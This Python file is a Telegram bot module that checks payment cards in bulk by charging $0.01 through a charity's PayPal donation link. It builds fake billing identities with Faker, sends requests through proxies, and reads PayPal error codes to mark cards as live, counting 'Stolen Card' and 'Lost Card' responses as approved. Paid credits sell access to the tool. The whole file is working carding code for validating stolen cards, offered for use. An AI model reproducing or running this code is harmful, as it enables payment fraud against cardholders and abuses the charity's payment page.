import re
import json
import requests
import asyncio
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import random
import uuid
from urllib.parse import quote_plus
from BOT.tools.proxy import get_proxy
from faker import Faker

user_locks = {}


class PaypalGate:
    """Paypal $0.01 Charge Gate - Real Checking"""
    
    def __init__(self, proxy=None):
        self.s = requests.Session()
        self.proxy = proxy
        self.fake = Faker('en_US')
        
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
        
        # Apply proxy if provided
        if proxy:
            self.s.proxies = {'http': proxy, 'https': proxy}
    
    def check_card(self, cc, mm, yy, cvv):
        """Full Paypal $0.01 charge check"""
        try:
            # Generate fake data
            first_name = self.fake.first_name()
            last_name = self.fake.last_name()
            address_1 = self.fake.street_address()
            
            ny_postcodes = [
                "10001", "10002", "10003", "10004", "10005", "10006", "10007", "10009", "10010",
                "10011", "10012", "10013", "10014", "10016", "10017", "10018", "10019", "10020",
                "10021", "10022", "10023", "10024", "10025", "10026", "10027", "10028", "10029",
                "10030", "10031", "10032", "10033", "10034", "10035", "10036", "10037", "10038"
            ]
            postcode = random.choice(ny_postcodes)
            email = self.fake.email(domain='gmail.com')
            area_code = random.choice(['212', '347', '646', '718', '917', '929'])
            phone = f"{area_code}{random.randint(1000000, 9999999)}"
            
            # Format card data
            cc_type = "VISA" if cc.startswith('4') else "MASTER_CARD" if cc.startswith('5') else "DISCOVER" if cc.startswith('6') else "AMERICAN_EXPRESS" if cc.startswith('3') else "VISA"
            
            # Format month
            if int(mm) < 10 and len(mm) == 1:
                mm = f'0{mm}'
            
            # Format year
            if len(yy) == 2:
                yy = f'20{yy}'
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': self.user_agent,
            }
            
            # Step 1: Visit donation page
            self.s.get('https://lpcenter.org/give/', headers=headers, timeout=30)
            
            # Step 2: Visit PayPal payment page
            headers['referer'] = 'https://lpcenter.org/'
            response = self.s.get('https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2', headers=headers, timeout=30)
            
            # Extract CSRF token
            csrf_token_match = re.search(r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']', response.text)
            if not csrf_token_match:
                return "Declined ❌", "Failed to get CSRF token"
            csrf_token = csrf_token_match.group(1)
            
            # Step 3: Create order
            headers.update({
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2',
                'x-csrf-token': csrf_token,
            })
            
            json_data = {
                'link_id': 'BKVC4EKUZY9K2',
                'merchant_id': 'ZDZWVC4R4XCGQ',
                'quantity': '1',
                'amount': '0.01',
                'currency': 'USD',
                'currencySymbol': '$',
                'funding_source': 'CARD',
                'button_type': 'VARIABLE_PRICE',
                'csrfRetryEnabled': True,
            }
            
            response = self.s.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data, timeout=30)
            order_data = response.json()
            
            # Handle CSRF mismatch
            if order_data.get('message') == 'CSRF_MISMATCH_RETRY':
                headers['x-csrf-token'] = order_data['csrfToken']
                order_data = self.s.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data, timeout=30).json()
            
            if 'context_id' not in order_data:
                return "Declined ❌", "Failed to create order"
            
            order_token = order_data['context_id']
            csrf_token = order_data.get('csrfToken', csrf_token)
            
            session_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
            button_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
            
            # Step 4: Pay with card
            headers.update({
                'accept-language': 'en-US,en;q=0.9',
                'paypal-client-context': order_token,
                'paypal-client-metadata-id': order_token,
                'priority': 'u=1, i',
                'referer': f'https://www.paypal.com/smart/card-fields?token={order_token}&sessionID={session_id}&buttonSessionID={button_id}&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US',
                'x-app-name': 'standardcardfields',
                'x-country': 'US',
                'x-csrf-token': csrf_token,
            })
            
            json_data = {
                'query': '''
                    mutation payWithCard(
                        $token: String!
                        $card: CardInput
                        $paymentToken: String
                        $phoneNumber: String
                        $firstName: String
                        $lastName: String
                        $shippingAddress: AddressInput
                        $billingAddress: AddressInput
                        $email: String
                        $currencyConversionType: CheckoutCurrencyConversionType
                        $installmentTerm: Int
                        $identityDocument: IdentityDocumentInput
                        $feeReferenceId: String
                    ) {
                        approveGuestPaymentWithCreditCard(
                            token: $token
                            card: $card
                            paymentToken: $paymentToken
                            phoneNumber: $phoneNumber
                            firstName: $firstName
                            lastName: $lastName
                            email: $email
                            shippingAddress: $shippingAddress
                            billingAddress: $billingAddress
                            currencyConversionType: $currencyConversionType
                            installmentTerm: $installmentTerm
                            identityDocument: $identityDocument
                            feeReferenceId: $feeReferenceId
                        ) {
                            flags {
                                is3DSecureRequired
                            }
                            cart {
                                intent
                                cartId
                                buyer {
                                    userId
                                    auth {
                                        accessToken
                                    }
                                }
                                returnUrl {
                                    href
                                }
                            }
                            paymentContingencies {
                                threeDomainSecure {
                                    status
                                    method
                                    redirectUrl {
                                        href
                                    }
                                    parameter
                                }
                            }
                        }
                    }
                ''',
                'variables': {
                    'token': order_token,
                    'card': {
                        'cardNumber': cc,
                        'type': cc_type,
                        'expirationDate': f'{mm}/{yy}',
                        'postalCode': postcode,
                        'securityCode': cvv,
                    },
                    'phoneNumber': phone,
                    'firstName': first_name,
                    'lastName': last_name,
                    'billingAddress': {
                        'givenName': first_name,
                        'familyName': last_name,
                        'line1': address_1,
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': postcode,
                        'country': 'US',
                    },
                    'shippingAddress': {
                        'givenName': first_name,
                        'familyName': last_name,
                        'line1': address_1,
                        'line2': None,
                        'city': 'New York',
                        'state': 'NY',
                        'postalCode': postcode,
                        'country': 'US',
                    },
                    'email': email,
                    'currencyConversionType': 'PAYPAL',
                },
                'operationName': None,
            }
            
            response = self.s.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                headers=headers,
                json=json_data,
                timeout=30
            )
            
            response_text = response.text
            
            # Parse response
            if 'VALIDATION_ERROR' in response_text:
                jsonresponse = response.json()
                message = jsonresponse['errors'][0]['message']
                return "Approved ✅", message[:40]
            
            elif 'errors' in response_text:
                jsonresponse = response.json()
                try:
                    code = jsonresponse['errors'][0]['data'][0]['code']
                except (KeyError, IndexError):
                    code = 'NULL'
                
                if "INVALID_SECURITY_CODE" in code:
                    return "CCN ✅", "CVC Mismatch"
                elif "OAS_VALIDATION_ERROR" in code:
                    return "Approved ✅", code
                elif "EXISTING_ACCOUNT_RESTRICTED" in code:
                    return "Approved ✅", "Account Restricted"
                elif "VALIDATION_ERROR" in code:
                    return "Approved ✅", code
                elif "CARD_DECLINED" in code:
                    return "Declined ❌", "Card Declined"
                elif "INSUFFICIENT_FUNDS" in code:
                    return "Approved ✅", "Insufficient Funds"
                elif "DO_NOT_HONOR" in code:
                    return "Approved ✅", "Do Not Honor"
                elif "LOST_CARD" in code:
                    return "Approved ✅", "Lost Card"
                elif "STOLEN_CARD" in code:
                    return "Approved ✅", "Stolen Card"
                elif "EXPIRED_CARD" in code:
                    return "Declined ❌", "Expired Card"
                elif "INVALID_CARD_NUMBER" in code:
                    return "Declined ❌", "Invalid Card Number"
                else:
                    return "Declined ❌", code[:40]
            
            elif 'is3DSecureRequired' in response_text:
                jsonresponse = response.json()
                is_3ds_required = (jsonresponse.get('data', {})
                                    .get('approveGuestPaymentWithCreditCard', {})
                                    .get('flags', {})
                                    .get('is3DSecureRequired', False))
                
                if is_3ds_required:
                    return "Approved ✅", "3D Secure Required"
                else:
                    return "Charged 💎", "Charged $0.01"
            
            else:
                return "Declined ❌", "Unknown Response"
                
        except requests.exceptions.Timeout:
            return "Declined ❌", "Timeout"
        except requests.exceptions.ProxyError:
            return "Declined ❌", "Proxy Error"
        except Exception as e:
            return "Declined ❌", str(e)[:40]


def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def check_paypal(cc, mm, yy, cvv, proxy=None):
    """Full Paypal check"""
    gate = PaypalGate(proxy=proxy)
    return gate.check_card(cc, mm, yy, cvv)

def is_free_user(user_id):
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True


@Client.on_message(filters.command("pp") & ~filters.edited)
async def paypal_single(client, message):
    """Single card Paypal $0.01 checker"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/pp cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/pp cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        proxy = get_proxy(message.from_user.id)
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>✦ [$pp] | Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>Paypal $0.01</code>",
            reply_to_message_id=message.id
        )
        
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_paypal, cc, mm, yy, cvv, proxy)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        final_msg = f"""<b>[#Paypal] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>💳 Card:</b> <code>{fullcc}</code>
<b>📊 Status:</b> <code>{status}</code>
<b>💬 Response:</b> <code>{response}</code>
<b>⏱️ Time:</b> <code>{timetaken}s</code>
<b>🌐 Gateway:</b> <code>Paypal $0.01 Charge</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By</b>: {profile} [<code>{plan} {badge}</code>]"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("mpp") & ~filters.edited)
async def paypal_mass(client, message):
    """Mass Paypal $0.01 checker"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mpp is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        mlimit = plan_info.get("mlimit", 10)
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            all_cards = all_cards[:mlimit]
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        proxy = get_proxy(message.from_user.id)
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mpp] | M-Paypal</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Paypal $0.01</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_paypal, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"• <b>Card:</b> <code>{card}</code>\n"
                    f"• <b>Status:</b> <code>{status}</code>\n"
                    f"• <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                try:
                    await loader_msg.edit(
                        f"<pre>✦ [$mpp] | M-Paypal</pre>\n"
                        + "\n".join(final_results[-8:]) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        final_text = f"<pre>✦ [$mpp] | M-Paypal</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
        final_text += f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]"
        
        if len(final_text) > 4000:
            import os
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/mpp_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass Paypal Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            await message.reply_document(
                filename,
                caption=f"<pre>✦ [$mpp] | M-Paypal Results</pre>\n"
                        f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]",
                reply_to_message_id=message.id
            )
            await loader_msg.delete()
            os.remove(filename)
        else:
            await loader_msg.edit(
                final_text,
                disable_web_page_preview=True
            )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
